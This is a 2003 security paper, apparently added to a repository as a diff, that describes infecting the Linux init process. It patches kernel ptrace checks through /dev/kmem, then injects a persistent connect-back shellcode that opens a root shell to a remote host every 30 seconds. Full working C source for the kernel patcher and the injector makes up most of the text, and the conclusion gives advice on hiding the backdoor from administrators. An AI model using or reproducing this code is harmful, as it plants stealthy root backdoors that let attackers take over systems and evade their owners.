@@ -1,0 +1,676 @@
+
+
+
+                   On-the-fly init(8) process infection
+
+                  Christophe Devine <devine@iie.cnam.fr>
+
+                            December 29th 2003
+
+
+
+--[ Contents
+
+  1 - Introduction
+  2 - Patching the kernel
+  3 - Shellcode injection
+  4 - Conclusion
+  5 - References
+  6 - Appendix
+
+
+--[ 1 - Introduction
+
+The method of debugging a running process with ptrace() so as to inject
+and run a shellcode is now well understood (see for example [2] or [3]).
+Here we'll focus more precisely on /sbin/init, which looks like a good
+target for the following reasons:
+
+  . there is always an init process on a linux system, no matter what.
+  . init runs as root, so we can drop a shell with full privileges.
+  . the sysadmin cannot restart init, or monitor it with strace.
+
+Well, of course those clever kernel guys have implemented some counter-
+measures, back in '99: the linux kernel will refuse any attempt to ptrace
+the init process. That's why we need to patch the kernel's code first;
+this paper only deals with linux 2.4.x running on ia32, since it's the
+most common setup nowadays.
+
+
+--[ 2 - Patching the kernel
+
+Let's have a look inside the ptrace() system call (sys_ptrace),
+located in arch/i386/kernel/ptrace.c:
+
+...
+        ret = -EPERM;
+        if (pid == 1)           /* you may not mess with init */
+                goto out_tsk;
+
+        if (request == PTRACE_ATTACH) {
+                ret = ptrace_attach(child);
+                goto out_tsk;
+        }
+...
+
+Once compiled, the code above translates into:
+
+c0109b80:       bd ff ff ff ff          mov    $0xffffffff,%ebp
+c0109b85:       83 fa 01                cmp    $0x1,%edx
+c0109b88:       0f 84 d7 04 00 00       je     c010a065 <sys_ptrace+0x569>
+c0109b8e:       83 fe 10                cmp    $0x10,%esi
+c0109b91:       75 10                   jne    c0109ba3 <sys_ptrace+0xa7>
+c0109b93:       57                      push   %edi
+c0109b94:       e8 17 fa 00 00          call   c01195b0 <ptrace_attach>
+
+Or with gcc 3.3.2 instead of 2.95:
+
+c010a99d:       49                      dec    %ecx
+c010a99e:       bf ff ff ff ff          mov    $0xffffffff,%edi
+c010a9a3:       74 6b                   je     c010aa10 <sys_ptrace+0x120>
+c010a9a5:       83 fb 10                cmp    $0x10,%ebx
+c010a9a8:       0f 84 62 05 00 00       je     c010af10 <sys_ptrace+0x620>
+...
+c010af10:       89 34 24                mov    %esi,(%esp,1)
+c010af13:       e8 68 32 01 00          call   c011e180 <ptrace_attach>
+
+
+The protection can thus be removed by searching for \x83\xF?\x10 and
+replacing \x83\xFA\x01 with \x83\xFA\x00, or \x74\x?? with \x70\x??.
+
+How do we get the location of sys_ptrace() ? The kernel may not have
+loadable module support compiled in, so we'll rather use the method
+described in [1]: the sidt instruction provides the IDT address, which
+contains a vector to the system_call() function (int 0x80). Afterwards,
+sys_call_table is located by looking for \xFF\x14\x85; sys_ptrace() is
+the 26th (__NR_ptrace) entry in this table.
+
+We aren't quite done yet, as ptrace_attach() contains yet another
+sanity check. From kernel/ptrace.c, line 56:
+
+...
+int ptrace_attach(struct task_struct *task)
+{
+        task_lock(task);
+        if (task->pid <= 1)
+                goto bad;
+..
+
+# objdump -d vmlinux | grep -A 4 -B 1 '<ptrace_attach>:'
+
+c01195b0 <ptrace_attach>:
+c01195b0:       53                      push   %ebx
+c01195b1:       8b 4c 24 08             mov    0x8(%esp,1),%ecx
+c01195b5:       83 79 7c 01             cmpl   $0x1,0x7c(%ecx)
+c01195b9:       0f 8e b1 01 00 00       jle    c0119770 <ptrace_attach+0x1c0>
+
+The address of ptrace_attach() can be found by searching for the relevant
+call opcode (\xE8) in sys_ptrace(). Finally, ptrace_attach() gets patched
+by replacing \x01 with \x00 after \x83\x79\x7C.
+
+Alright, we have full control over init now:
+
+# strace -p 1
+attach: ptrace(PTRACE_ATTACH, ...): Operation not permitted
+# gcc ptrace_init.c
+# ./a.out
+  . sct @ 0xC02E0DB8
+  . kp1 @ 0xC0109B87
+  . kp2 @ 0xC01195B8
+  + kernel patched
+# strace -p 1
+select(11, [10], NULL, NULL, {4, 110000}) = 0 (Timeout)
+time([1072797696])                      = 1072797696
+stat64("/dev/initctl", {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+
+
+--[ 3 - Shellcode injection
+
+There are actually two shellcodes used to infect the process. The first
+one calls mmap() to reserve a memory mapping where the "real" shellcode
+will live. It also sets up an alarm of 30 seconds, and registers the
+signal handler of SIGALRM.
+
+The connect-back shellcode is then copied onto the memory area, along
+with the necessary data (host port and ip). This way, every 30 seconds
+the shellcode wakes up and attempts to connect to the remote host.
+If successful, it will fork and spawn a shell:
+
+# gcc rpsc_inject.c
+# ./a.out
+usage: ./a.out <pid> <port> <hostname>
+# ./a.out 1 2004 localhost
+  . attached to process 1
+  . running mmap shellcode
+  . mapped area @ 0x40014000
+  + backdoor code injected
+# nc -v -l -p 2004
+listening on [any] 2004 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 1055
+uname -a
+Linux nice 2.4.23 #1 Mon Dec 28 20:32:07 CET 2003 i686 unknown
+id
+uid=0(root) gid=0(root)
+
+
+--[ 4 - Conclusion
+
+There is no such thing as a perfect backdoor, fortunately. After
+ptracing init, the kernel puts the process at the end of the task
+list. As a result, init appears at the bottom of ps' output:
+
+$ ps ax | tail -n 3
+    1 ?        S      0:03 init [2]
+  168 tty1     R      0:00 ps ax
+  169 tty1     R      0:00 -bash
+
+This may alert a clever admin, and give him a clue that his system
+was compromised. Therefore it may be wiser to infect another process,
+for example the kernel log daemon (klogd).
+
+
+--[ 5 - References
+
+[1] "Linux on-the-fly kernel patching without LKM", Phrack #58.
+
+[2] "Runtime Process Infection", Phrack #59.
+
+[3] "Runtime Process Infection 2", ElectronicSouls.
+
+
+--[ 6 - Appendix
+
+$ cat ptrace_init.c
+
+/*
+ *  2.4.x kernel patcher that allows ptracing the init process
+ *
+ *  Copyright (C) 2003  Christophe Devine <devine@iie.cnam.fr>
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program; if not, write to the Free Software
+ *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+*/
+
+#define _GNU_SOURCE
+
+#include <asm/unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int kmem_fd;
+
+/* low level utility subroutines */
+
+void read_kmem( off_t offset, void *buf, size_t count )
+{
+    if( lseek( kmem_fd, offset, SEEK_SET ) != offset )
+    {
+        perror( "lseek(kmem)" );
+        exit( 1 );
+    }
+  
+    if( read( kmem_fd, buf, count ) != (long) count )
+    {
+        perror( "read(kmem)" );
+        exit( 2 );
+    }
+}
+
+void write_kmem( off_t offset, void *buf, size_t count )
+{
+    if( lseek( kmem_fd, offset, SEEK_SET ) != offset )
+    {
+        perror( "lseek(kmem)" );
+        exit( 3 );
+    }
+  
+    if( write( kmem_fd, buf, count ) != (long) count )
+    {
+        perror( "write(kmem)" );
+        exit( 4 );
+    }
+}
+
+#define GCC_295 2
+#define GCC_3XX 3
+#define BUFSIZE 256
+
+int main( void )
+{
+    int kmode, gcc_ver;
+    int idt, int80, sct, ptrace;
+    char buffer[BUFSIZE], *p, c;
+
+    /* open /dev/kmem in read-write mode */
+    
+    if( ( kmem_fd = open( "/dev/kmem", O_RDWR ) ) < 0 )
+    {
+        dev_t kmem_dev = makedev( 1, 2 );
+
+        perror( "open(/dev/kmem)" );
+
+        if( mknod( "/tmp/kmem", 0600 | S_IFCHR, kmem_dev ) < 0 )
+        {
+            perror( "mknod(/tmp/kmem)" );
+            return( 16 );
+        }
+
+        if( ( kmem_fd = open( "/tmp/kmem", O_RDWR ) ) < 0 )
+        {
+            perror( "open(/tmp/kmem)" );
+            return( 17 );
+        }
+
+        unlink( "/tmp/kmem" );
+    }
+
+    /* get interrupt descriptor table address */
+
+    asm( "sidt %0" : "=m" ( buffer ) );
+    idt = *(int *)( buffer + 2 );
+
+    /* get system_call() address */
+
+    read_kmem( idt + ( 0x80 << 3 ), buffer, 8 );
+    int80 = ( *(unsigned short *)( buffer + 6 ) << 16 )
+            + *(unsigned short *)( buffer );
+
+    /* get system_call_table address */
+
+    read_kmem( int80, buffer, BUFSIZE );
+
+    if( ! ( p = memmem( buffer, BUFSIZE, "\xFF\x14\x85", 3 ) ) )
+    {
+        fprintf( stderr, "fatal: can't locate sys_call_table\n" );
+        return( 18 );
+    }
+
+    sct = *(int *)( p + 3 );
+
+    printf( "  . sct @ 0x%08X\n", sct );
+
+    /* get sys_ptrace() address and patch it */
+
+    read_kmem( (off_t) ( p + 3 - buffer + syscall ), buffer, 4 );
+    read_kmem( sct + __NR_ptrace * 4, (void *) &ptrace, 4 );
+    read_kmem( ptrace, buffer, BUFSIZE );
+
+    if( ( p = memmem( buffer, BUFSIZE, "\x83\xFE\x10", 3 ) ) )
+    {
+        p -= 7;
+        c = *p ^ 1;
+        kmode = *p & 1;
+        gcc_ver = GCC_295;
+    }
+    else
+    {
+        if( ( p = memmem( buffer, BUFSIZE, "\x83\xFB\x10", 3 ) ) )
+        {
+            p -= 2;
+            c = *p ^ 4;
+            kmode = *p & 4;
+            gcc_ver = GCC_3XX;
+        }
+        else
+        {
+            fprintf( stderr, "fatal: can't find patch 1 address\n" );
+            return( 19 );
+        }
+    }
+
+    write_kmem( p - buffer + ptrace, &c, 1 );
+
+    printf( "  . kp1 @ 0x%08X\n", p - buffer + ptrace );
+
+    /* get ptrace_attach() address and patch it */
+
+    if( gcc_ver == GCC_3XX )
+    {
+        p += 5;
+        ptrace += *(int *)( p + 2 ) + p + 6 - buffer;
+        read_kmem( ptrace, buffer, BUFSIZE );
+        p = buffer;
+    }
+
+    if( ! ( p = memchr( p, 0xE8, 24 ) ) )
+    {
+        fprintf( stderr, "fatal: can't locate ptrace_attach\n" );
+        return( 20 );
+    }
+
+    ptrace += *(int *)( p + 1 ) + p + 5 - buffer;
+    read_kmem( ptrace, buffer, BUFSIZE );
+
+    if( ! ( p = memmem( buffer, BUFSIZE, "\x83\x79\x7C", 3 ) ) )
+    {
+        fprintf( stderr, "fatal: can't find patch 2 address\n" );
+        return( 21 );
+    }
+
+    c = ( ! kmode );
+    write_kmem( p + 3 - buffer + ptrace, &c, 1 );
+
+    printf( "  . kp2 @ 0x%08X\n", p + 3 - buffer + ptrace );
+
+    /* success */
+
+    if( c ) printf( "  - kernel unpatched\n" );
+    else    printf( "  + kernel patched\n" );
+
+    close( kmem_fd );
+    return( 0 );
+}
+
+EOF
+
+$ cat rpsc_inject.c
+
+/*
+ *  Runtime process shellcode injector for linux on ia32
+ *
+ *  Copyright (C) 2003  Christophe Devine <devine@iie.cnam.fr>
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program; if not, write to the Free Software
+ *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ */
+
+#include <sys/ptrace.h>
+#include <asm/unistd.h>
+#include <netinet/in.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <netdb.h>
+
+void shellcode_start( void );
+void mmap_shellcode( void );
+void mmap_end( void );
+void connect_shellcode( void );
+void shellcode_end( void );
+
+int _ptrace( int request, int pid, void *addr, void *data )
+{
+    int ret;
+
+    if( ( ret = ptrace( request, pid, addr, data ) == -1 ) )
+    {
+        switch( request )
+        {
+            case PTRACE_CONT:     perror( "PTRACE_CONT"     ); break;
+            case PTRACE_ATTACH:   perror( "PTRACE_ATTACH"   ); break;
+            case PTRACE_GETREGS:  perror( "PTRACE_GETREGS"  ); break;
+            case PTRACE_SETREGS:  perror( "PTRACE_SETREGS"  ); break;
+            case PTRACE_POKEDATA: perror( "PTRACE_POKEDATA" ); break;
+            default: perror( "ptrace" ); break;
+        }
+        exit( 255 );
+    }
+
+    return( ret );
+}
+
+#define VM_SIZE 4096
+
+int main( int argc, char *argv[] )
+{
+    int pid, port, i, n, vma;
+    struct hostent *host_entry;
+    struct user_regs_struct reg;
+    struct user_regs_struct reg2;
+
+    /* check the arguments */
+
+    if( argc != 4 )
+    {
+    usage:
+        printf( "usage: %s <pid> <port> <hostname>\n", argv[0] );
+        return( 1 );
+    }
+
+    if( ! ( pid  = atol( argv[1] ) ) ||
+        ! ( port = atol( argv[2] ) ) )
+        goto usage;
+
+    /* resolve the remote host */
+
+    if( ( host_entry = gethostbyname( argv[3] ) ) == NULL )
+    {
+        fprintf( stderr, "gethostbyname failed\n" );
+        return( 2 );
+    }
+
+    /* attach to the target process */
+
+    _ptrace( PTRACE_ATTACH, pid, 0, 0 );
+    kill( pid, SIGSTOP );
+    waitpid( pid, NULL, WUNTRACED );
+
+    printf( "  . attached to process %d\n", pid );
+
+    /* inject the mmap shellcode on the stack */
+
+    _ptrace( PTRACE_GETREGS, pid, NULL, &reg );
+    memcpy( &reg2, &reg, sizeof( reg ) );
+
+    reg.esp -= 4;
+    reg.eip = reg.esp - 512;
+
+    for( i = 0; i < mmap_end - shellcode_start; i += 4 )
+    {
+        _ptrace( PTRACE_POKEDATA, pid, (void *) ( reg.eip + i ),
+                 (void *)( *(int *) ( shellcode_start + i ) ) );
+    }
+
+    /* complete interrupted system call & mmap() */
+
+    printf( "  . running mmap shellcode\n" );
+
+    reg.eip += mmap_shellcode - shellcode_start + 2;
+
+    _ptrace( PTRACE_SETREGS, pid, NULL, &reg );
+    _ptrace( PTRACE_SYSCALL, pid, NULL, NULL );
+    waitpid( pid, NULL, 0 );
+    _ptrace( PTRACE_GETREGS, pid, NULL, &reg );
+
+    n = ( reg.orig_eax != __NR_mmap ) + 1;
+
+    for( i = 0; i < n; i++ )
+    {
+        _ptrace( PTRACE_SYSCALL, pid, NULL, NULL );
+        waitpid( pid, NULL, 0 );
+    }
+
+    _ptrace( PTRACE_GETREGS, pid, NULL, &reg );
+
+    printf( "  . mapped area @ 0x%08X\n", vma = reg.eax );
+
+    /* complete signal() & alarm() */
+
+    for( i = 0; i < 4; i++ )
+    {
+        _ptrace( PTRACE_SYSCALL, pid, NULL, NULL );
+        waitpid( pid, NULL, 0 );
+    }
+
+    /* now inject the backdoor shellcode and the port/ip */
+
+    for( i = 0; i < shellcode_end - shellcode_start; i += 4 )
+    {
+        _ptrace( PTRACE_POKEDATA, pid, (void *) ( vma + i ),
+                 (void *) ( *(int *)( shellcode_start + i ) ) );
+    }
+
+    n = *(int *) host_entry->h_addr;
+
+    _ptrace( PTRACE_POKEDATA, pid, (void *) ( vma + VM_SIZE - 8 ),
+                                   (void *) port );
+
+    _ptrace( PTRACE_POKEDATA, pid, (void *) ( vma + VM_SIZE - 4 ),
+                                   (void *) n );
+
+    printf( "  + backdoor code injected\n" );
+
+    /* finally, restore registers and detach */
+
+    _ptrace( PTRACE_SETREGS, pid, NULL, &reg2 );
+    _ptrace( PTRACE_CONT, pid, NULL, NULL );
+
+    return( 0 );
+}
+
+void shellcode_start( void ) {}
+
+int do_syscall1( int nr, ... )
+{
+    int ret;
+    asm( "pusha            " );
+    asm( "mov  8(%ebp),%eax" );
+    asm( "mov 12(%ebp),%ebx" );
+    asm( "mov 16(%ebp),%ecx" );
+    asm( "mov 20(%ebp),%edx" );
+    asm( "mov 24(%ebp),%esi" );
+    asm( "mov 28(%ebp),%edi" );
+    asm( "int $0x80        " );
+    asm( "mov %eax,-4(%ebp)" );
+    asm( "popa             " );
+    return( ret );
+}
+
+int do_syscall2( int nr, ... )
+{
+    int ret;
+    asm( "push %ebx        " );
+    asm( "mov 8(%ebp),%eax " );
+    asm( "mov %ebp,%ebx    " );
+    asm( "add $12,%ebx     " );
+    asm( "int $0x80        " );
+    asm( "mov %eax,-4(%ebp)" );
+    asm( "pop %ebx         " );
+    return( ret );
+}
+
+#define CS_ADDR ( vma + connect_shellcode - shellcode_start )
+
+void mmap_shellcode( void )
+{
+    int vma = do_syscall2( __NR_mmap, 0, VM_SIZE,
+                PROT_EXEC | PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, 0, 0 );
+
+    do_syscall1( __NR_signal, SIGALRM, CS_ADDR );
+    do_syscall1( __NR_alarm, 30 );
+
+    while( 1 );
+}
+
+void mmap_end( void ) {}
+
+#define SYS_SOCKET  1
+#define SYS_CONNECT 3
+
+int get_eip( void )
+{
+    int ret;
+    asm( "call delta" );
+    asm( "delta: pop %eax" );
+    asm( "mov %eax,-4(%ebp)" );
+    return( ret );
+}
+
+void connect_shellcode( void )
+{
+    int vma, port, sock;
+    unsigned long net_args[3];
+    struct sockaddr_in host_addr;
+
+    vma = get_eip() & 0xFFFFF000;
+
+    net_args[0] = AF_INET;
+    net_args[1] = SOCK_STREAM;
+    net_args[2] = 0;
+
+    sock = do_syscall1( __NR_socketcall, SYS_SOCKET, net_args );
+
+    if( sock < 0 )
+        goto connect_exit;
+
+    port = *(int *)( vma + VM_SIZE - 8 );
+
+    host_addr.sin_family = AF_INET;
+    host_addr.sin_port = ( port >> 8 ) | ( ( port & 0xFF ) << 8 );
+    host_addr.sin_addr.s_addr = *(int *)( vma + VM_SIZE - 4 );
+
+    net_args[0] = sock;
+    net_args[1] = (unsigned long) &host_addr;
+    net_args[2] = sizeof( host_addr );
+
+    if( do_syscall1( __NR_socketcall, SYS_CONNECT, net_args ) < 0 )
+    {
+        do_syscall1( __NR_close, sock );
+        goto connect_exit;
+    }
+
+    if( ! do_syscall1( __NR_fork ) )
+    {
+        char shell[8], *argv[2], *envp[1];
+        
+        do_syscall1( __NR_dup2, sock, 0 );
+        do_syscall1( __NR_dup2, sock, 1 );
+        do_syscall1( __NR_dup2, sock, 2 );
+
+        if( sock > 2 ) do_syscall1( __NR_close, sock );
+
+        shell[0] = '/'; shell[4] = '/';
+        shell[1] = 'b'; shell[5] = 's';
+        shell[2] = 'i'; shell[6] = 'h';
+        shell[3] = 'n'; shell[7] = '\0';
+
+        argv[0] = shell;
+        argv[1] = envp[0] = NULL;
+
+        do_syscall1( __NR_execve, shell, argv, envp );
+        do_syscall1( __NR_exit, 1 );
+    }
+
+    do_syscall1( __NR_close, sock );
+
+connect_exit:
+
+    do_syscall1( __NR_signal, SIGALRM, CS_ADDR );
+    do_syscall1( __NR_alarm, 30 );
+}
+
+void shellcode_end( void ) {}
+
+EOF
+
